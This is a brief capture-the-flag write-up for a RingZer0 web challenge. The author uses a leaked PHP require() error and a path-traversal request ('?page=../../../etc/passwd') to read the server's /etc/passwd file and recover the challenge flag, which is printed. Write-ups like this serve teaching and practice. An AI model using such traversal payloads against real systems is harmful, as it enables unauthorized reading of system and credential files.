# Looking for password file

### Author

[Mr.Un1k0d3r](https://twitter.com/mrun1k0d3r)

### Description

No description
 
## Solution
 
Opening the website we immediately see that the link accepts a GET parameter with the page name (`http://challenges.ringzer0team.com:10075/?page=lorem.php`). Changing `lorem.php` with `test` we get an interesting error:

```
Warning: require(test): failed to open stream: No such file or directory in /var/www/html/index.php on line 43

Fatal error: require(): Failed opening required 'test' (include_path='.:/usr/share/php') in /var/www/html/index.php on line 43
```
In particular, now we know that we are located in `/var/www/html`. The challenge title suggest that we should look for the `/etc/passwd` file. Hence, we try to open `http://challenges.ringzer0team.com:10075/?page=../../../etc/passwd` and we get rewarded with the correct file containing the flag `FLAG-zH9g1934v774Y7Zx5s16t5ym8Z`.